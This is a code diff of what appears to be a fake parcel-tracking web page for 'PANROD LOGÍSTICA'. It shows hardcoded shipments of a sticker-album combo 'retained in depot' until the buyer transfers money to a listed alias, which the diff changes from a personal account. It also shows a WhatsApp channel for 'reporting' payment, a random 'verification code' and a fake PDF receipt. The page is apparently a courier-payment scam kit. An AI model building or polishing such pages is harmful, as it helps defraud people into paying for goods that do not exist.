@@ -894,48 +894,48 @@ animation:spin 1s linear infinite;
 <div class="modal" id="modalPago">
     <div class="modal-content" style="max-width:750px;">
         <span class="close" onclick="cerrarPago()">×</span>
-        <h2>Método de Pago Disponible</h2>
+        <h2>Métodos de Pago Disponibles</h2>
 
         <div id="transferencia" class="payment-method active">
-
             <h3>🏦 Transferencia Bancaria</h3>
 
             <div class="box">
-    <strong>Alias</strong>
-    <span class="val" id="alias">ESTANPERFECTO.OK</span>
-    <button onclick="copiarTexto('alias')">📋 Copiar</button>
-</div>
+                <strong>Alias</strong>
+                <span class="val" id="alias">PANROD.LOGISTICA</span>
+                <button onclick="copiarTexto('alias')">📋 Copiar</button>
+            </div>
 
             <div class="box">
-    <strong>CVU</strong>
-    <span class="val" id="cvu">0000003100000000000000</span>
-    <button onclick="copiarTexto('cvu')">📋 Copiar</button>
-</div>
+                <strong>CVU</strong>
+                <span class="val" id="cvu">0000003100000000000000</span>
+                <button onclick="copiarTexto('cvu')">📋 Copiar</button>
+            </div>
 
-<div class="box">
-    <strong>CBU</strong>
-    <span class="val" id="cbu">0000000000000000000000</span>
-    <button onclick="copiarTexto('cbu')">📋 Copiar</button>
-</div>
+            <div class="box">
+                <strong>CBU</strong>
+                <span class="val" id="cbu">0000000000000000000000</span>
+                <button onclick="copiarTexto('cbu')">📋 Copiar</button>
+            </div>
 
-<div class="box">
-    <strong>Titular</strong>
-    <span class="val" id="titular">CAMILA CALOGERO</span>
-    <button onclick="copiarTexto('titular')">📋 Copiar</button>
-</div>
+            <div class="box">
+                <strong>Titular</strong>
+                <span class="val" id="titular">PANROD</span>
+                <button onclick="copiarTexto('titular')">📋 Copiar</button>
+            </div>
 
-<div class="box">
-    <strong>Banco</strong>
-    <span class="val" id="banco">CLARO PAY</span>
-    <button onclick="copiarTexto('banco')">📋 Copiar</button>
-</div>
+            <div class="box">
+                <strong>Banco</strong>
+                <span class="val" id="banco">Banco Nación Argentina</span>
+                <button onclick="copiarTexto('banco')">📋 Copiar</button>
+            </div>
 
             <button class="btn-action btn-support" onclick="enviarReportePagoLogistica()">
-    Informar Transferencia
-</button>
+                Informar Transferencia
+            </button>
         </div>
     </div>
 </div>
+
 <div class="modal" id="loadingModal">
     <div class="modal-content" style="max-width:300px;text-align:center;">
         <div class="loader"></div>
@@ -946,8 +946,7 @@ animation:spin 1s linear infinite;
     </div>
 </div>
 <script>
-// Base de datos simulada
-// 1. BASE DE DATOS CONFIGURABLE
+// 1. BASE DE DATOS CONFIGURABLE (SISTEMA DE PRECIOS LOGÍSTICOS)
 const envios = {
     "ALBUM10": {
         producto: "Combo: Álbum Oficial de la Selección + 50 Paquetes de Figuritas",
@@ -957,34 +956,27 @@ const envios = {
         destino: "Rosario, Santa Fe",
         direccionEntrega: "Pellegrini 1420, Piso 2 (CP 2000)",
         receptor: "Leo Medina",
-        pagado: false, // Al ser false, no mostrará los pasos de envío
+        pagado: false,
         modalidadPago: null,
-        pasoActual: 1, // No afecta si pagado es false, pero por defecto inicia en 1
+        pasoActual: 1,
         fechasLog: { creada: "04/06/2026 - 08:30 hs", pago: "", verificado: "", viaje: "", camino: "", entrega: "" }
     },
-    ALBUM30: {
-    producto: "Álbum de Figuritas Tapa Dura - Edición Especial Campeones del Mundo",
-    precioProducto: 220000,
-    precioEnvio: 15000,
-    origen: "Depósito Central PANROD",
-    destino: "Mar del Plata, Buenos Aires",
-    direccionEntrega: "Av. Colón 2340",
-    receptor: "Matías Rossi",
-    pagado: true,
-    modalidadPago: "Transferencia Bancaria",
-    pasoActual: 2,
-    fechasLog: {
-        creada: "04/06/2026 - 08:30 hs",
-        pago: "04/06/2026 - 09:11 hs",
-        verificado: "",
-        viaje: "",
-        camino: "",
-        entrega: ""
+    "ALBUM30": {
+        producto: "Álbum de Figuritas Tapa Dura - Edición Especial Campeones del Mundo",
+        precioProducto: 22000,
+        precioEnvio: 0,
+        origen: "Depósito Central PANROD",
+        destino: "Mar del Plata, Buenos Aires",
+        direccionEntrega: "Av. Colón 2340",
+        receptor: "Matías Rossi",
+        pagado: true,
+        modalidadPago: "Transferencia Bancaria",
+        pasoActual: 4,
+        fechasLog: { creada: "04/06/2026 - 08:30 hs", pago: "", verificado: "", viaje: "", camino: "", entrega: "" }
     }
-}
 };
 
-
+// Elementos de la interfaz de usuario
 const inputCodigo = document.getElementById("codigo");
 const btnBuscar = document.getElementById("btnBuscar");
 const errorInput = document.getElementById("errorInput");
@@ -998,236 +990,31 @@ function generarCodigoVerificacion() {
     return `${part1}-${part2}`;
 }
 
-// NUEVA FUNCIÓN AGREGADA PARA REPARAR EL BOTÓN DE PAGO
+// CONTROL DE VENTANAS MODALES
 function abrirPago() {
     document.getElementById("modalPago").style.display = "flex";
 }
-
-// 2. LÓGICA DE PROCESAMIENTO DINÁMICO
-function buscarEnvio(){
-
-    document.getElementById("loadingModal").style.display = "flex";
-
-    setTimeout(() => {
-        const codigo = inputCodigo.value.trim().toUpperCase();
-        const envio = envios[codigo];
-    if (!envio) {
-    document.getElementById("loadingModal").style.display = "none";
-    errorInput.style.display = "block";
-    inputCodigo.style.borderColor = "#ef4444";
-    return;
-}
-
-    errorInput.style.display = "none";
-    inputCodigo.style.borderColor = "transparent";
-
-    let totalAbonar = envio.precioProducto + envio.precioEnvio;
-    let progreso = envio.pasoActual;
-
-    // Estructura secuencial de los 6 pasos posibles
-    let stepsConfig = [
-        { num: 1, titulo: "Producto depositado por el vendedor en casa central", fecha: envio.fechasLog.creada },
-        { num: 2, titulo: "Pago total verificado y acreditado en sistema", fecha: envio.fechasLog.pago || "Pendiente" },
-        { num: 3, titulo: "Paquete verificado y empaquetado con datos de entrega del cliente", fecha: envio.fechasLog.verificado || "Pendiente" },
-        { num: 4, titulo: `En viaje hacia centro de distribución regional de ${envio.destino}`, fecha: envio.fechasLog.viaje || "Pendiente" },
-        { num: 5, titulo: "En camino al domicilio (En tránsito)", fecha: envio.fechasLog.camino || "Pendiente" },
-        { num: 6, titulo: "Entregado exitosamente al destinatario", fecha: envio.fechasLog.entrega || "Pendiente" }
-    ];
-
-    // Si NO está pagado, forzamos a que solo muestre el paso 1 activo y recortamos la lista al paso 3 por interfaz limpia
-    if(!envio.pagado) {
-        progreso = 1;
-        stepsConfig = stepsConfig.slice(0, 3);
-    }
-
-    let timelineHTML = "";
-    stepsConfig.forEach((step) => {
-        // Un paso está activo si el progreso actual es mayor o igual a su número de orden
-        let esActivo = progreso >= step.num;
-        let classStatus = esActivo ? "is-active" : "";
-        let fechaMostrar = esActivo ? step.fecha : "Pendiente";
-
-        timelineHTML += `
-        <div class="step ${classStatus}">
-            <div class="circle"></div>
-            <h4>${step.titulo}</h4>
-            <small>${fechaMostrar}</small>
-        </div>
-        `;
-    });
-
-    let checkoutHTML = "";
-    if(!envio.pagado) {
-        checkoutHTML = `
-        <div class="checkout-box pending">
-            <div class="price-detail">
-                <p>Valor del Paquete/Producto: <span>$${envio.precioProducto}</span></p>
-                <p>Costo de Envío: <span>$${envio.precioEnvio}</span></p>
-                <p class="total">Total a Pagar: <span>$${totalAbonar}</span></p>
-            </div>
-            <div class="action-area">
-                <button class="btn-action btn-pay" onclick="abrirPago()">
-    Abonar Producto y Envío
-</button>
-                <button class="btn-action btn-support"
-onclick="window.open('https://wa.me/541136514766?text=' + encodeURIComponent('Hola PANROD. Necesito ayuda con mi envío. Código de seguimiento: ' + document.getElementById('codigo').value + '. Tengo una consulta o inconveniente y quisiera recibir asistencia.'),'_blank')">
-    💬 Contactar Soporte Técnico
-</button>
-            </div>
-            <p class="legal-notice">⚠️ IMPORTANTE: El producto se encuentra registrado y reservado para el destinatario. La preparación, embalaje y distribución comenzarán una vez acreditado el pago correspondiente. Los repartidores no reciben pagos al momento de la entrega.</p>
-        </div>
-        `;
-    } else {
-checkoutHTML = `
-        <div class="checkout-box">
-            <div class="price-detail">
-                <p>Valor del Paquete/Producto: <span>$${envio.precioProducto}</span></p>
-                <p>Costo de Envío: <span>${envio.precioEnvio === 0 ? '¡Bonificado!' : '$' + envio.precioEnvio}</span></p>
-                <p class="total">Total Facturado: <span>$${totalAbonar}</span></p>
-            </div>
-            <div class="action-area">
-                <button class="btn-action btn-download" onclick="alert('Descargando comprobante en PDF...')">📥 Descargar Comprobante Acreditado</button>
-            </div>
-            <p class="legal-notice" style="color: #059669;">Acreditado vía ${envio.modalidadPago}.</p>
-        </div>
-        `;
-    }
-
-    let codigoVerificacionHTML = "";
-    if (envio.pagado) {
-        const tokenDinamico = generarCodigoVerificacion();
-        codigoVerificacionHTML = `
-            <div style="font-size: 24px; font-weight: 800; color: #0f172a; letter-spacing: 2px; padding: 10px; border: 2px dashed #0284c7; background: #f0f9ff; border-radius: 10px; margin: 10px 0;">
-                ${tokenDinamico}
-            </div>
-            <p style="font-size: 11px; color: #64748b; line-height: 1.4; font-weight: 500; margin-top: 5px;">
-                <strong>Código de Recepción Asegurada:</strong> Este código dinámico será solicitado por el distribuidor cuando se encuentre a menos de 2 KM de distancia del domicilio.
-            </p>
-        `;
-    } else {
-        codigoVerificacionHTML = `
-            <div style="font-size: 14px; font-weight: 700; color: #ef4444; padding: 15px; border: 2px dashed #fee2e2; background: #fff5f5; border-radius: 10px; margin: 10px 0;">
-                BLOQUEADO
-            </div>
-            <p style="font-size: 11px; color: #94a3b8; line-height: 1.4;">
-                El código de validación de entrega se activará automáticamente una vez que el pago se encuentre consolidado en el sistema.
-            </p>
-        `;
-    }
-
-    // Determinar texto del estado general según el paso configurado
-    let estadoEnvioTexto = "Retenido en Depósito";
-    if (envio.pagado) {
-        if (progreso >= 6) {
-            estadoEnvioTexto = "Entregado";
-        } else if (progreso >= 4) {
-            estadoEnvioTexto = "En Distribución";
-        } else {
-            estadoEnvioTexto = "Procesando en Planta Central";
-        }
-    }
-
-    resultado.innerHTML = `
-<div class="tracking-grid">
-    <div class="left-side">
-        ${checkoutHTML}
-
-        <div class="datos">
-            <div class="box"><strong>Código de Seguimiento</strong><span class="val">${codigo}</span></div>
-            <div class="box"><strong>Paquete en Custodia</strong><span class="val">${envio.producto}</span></div>
-            <div class="box"><strong>Comprador Destinatario</strong><span class="val">${envio.receptor}</span></div>
-            <div class="box"><strong>Dirección de Destino</strong><span class="val">${envio.direccionEntrega}</span></div>
-            <div class="box"><strong>Origen</strong><span class="val">${envio.origen}</span></div>
-            <div class="box"><strong>Entrega</strong><span class="val">${envio.destino}</span></div>
-        </div>
-
-        <h3>Historial de Movimientos</h3>
-        <div class="timeline">
-            ${timelineHTML}
-        </div>
-    </div>
-
-    <div class="right-side">
-        <div class="delivery-sidebar">
-            <h3>Verificación de Identidad</h3>
-            <p>Validación para el transportista.</p>
-
-            ${codigoVerificacionHTML}
-
-            <hr>
-
-            <span class="${envio.pagado ? 'pagado' : 'nopagado'}">
-                ${envio.pagado ? '✓ PAGO EFECTUADO' : '⚠ PENDIENTE DE PAGO'}
-            </span>
-        </div>
-    </div>
-</div>
-`;
-
-modal.style.display = "flex";
-document.getElementById("loadingModal").style.display = "none";
-
-    }, 1200); // cierre del setTimeout
-
-} // cierre de buscarEnvio
-            btnBuscar.addEventListener("click", buscarEnvio);
-
-inputCodigo.addEventListener("keypress", function(e){
-    if(e.key === "Enter"){
-        buscarEnvio();
-    }
-});
 
 function cerrarPago() {
     document.getElementById("modalPago").style.display = "none";
 }
 
-function copiarTexto(id) {
-    const texto = document.getElementById(id).innerText;
-
-    navigator.clipboard.writeText(texto).then(() => {
-        const btn = event.target;
-        const original = btn.innerHTML;
-
-        btn.innerHTML = "✅ Copiado";
-
-        setTimeout(() => {
-btn.innerHTML = original;
-        }, 1500);
-    });
-            }
-            btnBuscar.addEventListener("click", buscarEnvio);
-
-inputCodigo.addEventListener("keypress", function(e){
-    if(e.key === "Enter"){
-        buscarEnvio();
-    }
-});
-                btnCerrar.addEventListener("click", () => {
-    modal.style.display = "none";
-});
-
-window.addEventListener("click", (e) => {
-    if (e.target === modal) {
-        modal.style.display = "none";
-    }
-            /**
- * Compila los datos del estado de cuenta actual y genera el mensaje 
- * formal de validación para el operador de soporte técnico.
+/**
+ * Compila de forma dinámica los precios y datos comerciales del pedido
+ * actual y ejecuta la redirección formal a la API de WhatsApp.
  */
 function enviarReportePagoLogistica() {
-    // Captura el código ingresado en el buscador central
-    const codigoInput = document.getElementById("codigo").value.trim().toUpperCase();
+    const codigoInput = inputCodigo.value.trim().toUpperCase();
     const envio = envios[codigoInput];
 
     if (!envio) {
-        alert("Error de validación: No se han detectado datos activos de ningún envío.");
+        alert("Error de validación: Busque un código de seguimiento válido antes de reportar un pago.");
         return;
     }
 
     const totalAbonar = envio.precioProducto + envio.precioEnvio;
 
-    // Estructuración formal solicitada para el control logístico
+    // Plantilla formal solicitada para la validación del depósito
     const mensajeWhatsApp = `Hola PANROD LOGÍSTICA.
 
 Deseo informar una transferencia para iniciar el proceso de distribución de mi pedido.
@@ -1246,12 +1033,187 @@ Adjunto comprobante de pago para su verificación.
 
 Muchas gracias.`;
 
-    // Compilación de URL segura e inicio de la petición externa
     const urlDestino = 'https://wa.me/541136514766?text=' + encodeURIComponent(mensajeWhatsApp);
     window.open(urlDestino, '_blank');
-            }
-            
+}
+
+// 2. LÓGICA DE PROCESAMIENTO DINÁMICO DE ENVÍOS
+function buscarEnvio(){
+    document.getElementById("loadingModal").style.display = "flex";
+
+    setTimeout(() => {
+        const codigo = inputCodigo.value.trim().toUpperCase();
+        const envio = envios[codigo];
+        
+        if (!envio) {
+            document.getElementById("loadingModal").style.display = "none";
+            errorInput.style.display = "block";
+            inputCodigo.style.borderColor = "#ef4444";
+            return;
+        }
+
+        errorInput.style.display = "none";
+        inputCodigo.style.borderColor = "transparent";
+
+        let totalAbonar = envio.precioProducto + envio.precioEnvio;
+        let progreso = envio.pasoActual;
+
+        let stepsConfig = [
+            { num: 1, titulo: "Producto depositado por el vendedor en casa central", fecha: envio.fechasLog.creada },
+            { num: 2, titulo: "Pago total verificado y acreditado en sistema", fecha: envio.fechasLog.pago || "Pendiente" },
+            { num: 3, titulo: "Paquete verificado y empaquetado con datos de entrega del cliente", fecha: envio.fechasLog.verificado || "Pendiente" },
+            { num: 4, titulo: `En viaje hacia centro de distribución regional de ${envio.destino}`, fecha: envio.fechasLog.viaje || "Pendiente" },
+            { num: 5, titulo: "En camino al domicilio del comprador (Unidad de Reparto)", fecha: envio.fechasLog.camino || "Pendiente" },
+            { num: 6, titulo: "Entregado exitosamente al destinatario", fecha: envio.fechasLog.entrega || "Pendiente" }
+        ];
+
+        if(!envio.pagado) {
+            progreso = 1;
+            stepsConfig = stepsConfig.slice(0, 3);
+        }
+
+        let timelineHTML = "";
+        stepsConfig.forEach((step) => {
+            let esActivo = progreso >= step.num;
+            let classStatus = esActivo ? "is-active" : "";
+            let fechaMostrar = esActivo ? step.fecha : "Pendiente";
+
+            timelineHTML += `
+            <div class="step ${classStatus}">
+                <div class="circle"></div>
+                <h4>${step.titulo}</h4>
+                <small>${fechaMostrar}</small>
+            </div>
+            `;
+        });
+
+        let checkoutHTML = "";
+        if(!envio.pagado) {
+            checkoutHTML = `
+            <div class="checkout-box pending">
+                <div class="price-detail">
+                    <p>Valor del Álbum / Figuritas: <span>$${envio.precioProducto}</span></p>
+                    <p>Costo de Envío EXPRESS: <span>$${envio.precioEnvio}</span></p>
+                    <p class="total">Total Neto a Pagar: <span>$${totalAbonar}</span></p>
+                </div>
+                <div class="action-area">
+                    <button class="btn-action btn-pay" onclick="abrirPago()">
+                        Abonar Producto y Envío
+                    </button>
+                    <button class="btn-action btn-support" onclick="abrirPago()">
+                        💬 Informar Pago a Logística
+                    </button>
+                </div>
+                <p class="legal-notice">⚠️ Los despachos físicos se bloquean de forma automatizada hasta la validación online del cobro de la mercadería por seguridad del proveedor.</p>
+            </div>
+            `;
+        } else {
+            checkoutHTML = `
+            <div class="checkout-box">
+                <div class="price-detail">
+                    <p>Valor del Álbum / Figuritas: <span>$${envio.precioProducto}</span></p>
+                    <p>Costo de Envío EXPRESS: <span>${envio.precioEnvio === 0 ? '¡Bonificado!' : '$' + envio.precioEnvio}</span></p>
+                    <p class="total">Total Facturado: <span>$${totalAbonar}</span></p>
+                </div>
+                <div class="action-area">
+                    <button class="btn-action btn-download" onclick="alert('Descargando comprobante en PDF...')">📥 Descargar Comprobante Acreditado</button>
+                </div>
+                <p class="legal-notice" style="color: #059669;">Acreditado vía ${envio.modalidadPago}.</p>
+            </div>
+            `;
+        }
+
+        let codigoVerificacionHTML = "";
+        if (envio.pagado) {
+            const tokenDinamico = generarCodigoVerificacion();
+            codigoVerificacionHTML = `
+                <div style="font-size: 24px; font-weight: 800; color: #0f172a; letter-spacing: 2px; padding: 10px; border: 2px dashed #0284c7; background: #f0f9ff; border-radius: 10px; margin: 10px 0;">
+                    ${tokenDinamico}
+                </div>
+                <p style="font-size: 11px; color: #64748b; line-height: 1.4; font-weight: 500; margin-top: 5px;">
+                    <strong>Código de Recepción Asegurada:</strong> Este código dinámico será solicitado por el distribuidor cuando se encuentre a menos de 2 KM de distancia del domicilio.
+                </p>
+            `;
+        } else {
+            codigoVerificacionHTML = `
+                <div style="font-size: 14px; font-weight: 700; color: #ef4444; padding: 15px; border: 2px dashed #fee2e2; background: #fff5f5; border-radius: 10px; margin: 10px 0;">
+                    BLOQUEADO
+                </div>
+                <p style="font-size: 11px; color: #94a3b8; line-height: 1.4;">
+                    El código de validación de entrega se activará automáticamente una vez que el pago se encuentre consolidado en el sistema.
+                </p>
+            `;
+        }
+
+        resultado.innerHTML = `
+        <div class="tracking-grid">
+            <div class="left-side">
+                ${checkoutHTML}
+                <div class="datos">
+                    <div class="box"><strong>Código Tracking</strong><span class="val">${codigo}</span></div>
+                    <div class="box"><strong>Mercadería en Custodia</strong><span class="val">${envio.producto}</span></div>
+                    <div class="box"><strong>Comprador Destinatario</strong><span class="val">${envio.receptor}</span></div>
+                    <div class="box"><strong>Dirección de Destino</strong><span class="val">${envio.direccionEntrega}</span></div>
+                    <div class="box"><strong>Origen</strong><span class="val">${envio.origen}</span></div>
+                    <div class="box"><strong>Jurisdicción</strong><span class="val">${envio.destino}</span></div>
+                </div>
+                <h3>Historial de Movimientos Cruzados</h3>
+                <div class="timeline">
+                    ${timelineHTML}
+                </div>
+            </div>
+            <div class="right-side">
+                <div class="delivery-sidebar">
+                    <h3>Verificación de Identidad</h3>
+                    <p>Validación para el transportista en punto de entrega.</p>
+                    ${codigoVerificacionHTML}
+                    <hr>
+                    <span class="${envio.pagado ? 'pagado' : 'nopagado'}">
+                        ${envio.pagado ? '✓ PAGO CONSOLIDADO' : '⚠ PENDIENTE DE PAGO'}
+                    </span>
+                </div>
+            </div>
+        </div>
+        `;
+
+        modal.style.display = "flex";
+        document.getElementById("loadingModal").style.display = "none";
+    }, 1200);
+}
+
+// ASIGNACIÓN ÚNICA DE EVENTOS DE INTERFAZ
+btnBuscar.addEventListener("click", buscarEnvio);
+
+inputCodigo.addEventListener("keypress", function(e){
+    if(e.key === "Enter"){
+        buscarEnvio();
+    }
 });
+
+btnCerrar.addEventListener("click", () => {
+    modal.style.display = "none";
+});
+
+window.addEventListener("click", (e) => {
+    if (e.target === modal) {
+        modal.style.display = "none";
+    }
+});
+
+function copiarTexto(id) {
+    const elemento = document.getElementById(id);
+    if (!elemento) return;
+    
+    const texto = elemento.innerText;
+    navigator.clipboard.writeText(texto).then(() => {
+        const btn = event.target;
+        const original = btn.innerHTML;
+        btn.innerHTML = "✅ Copiado";
+        setTimeout(() => {
+            btn.innerHTML = original;
+        }, 1500);
+    });
+}
 </script>
 </body>
 </html>
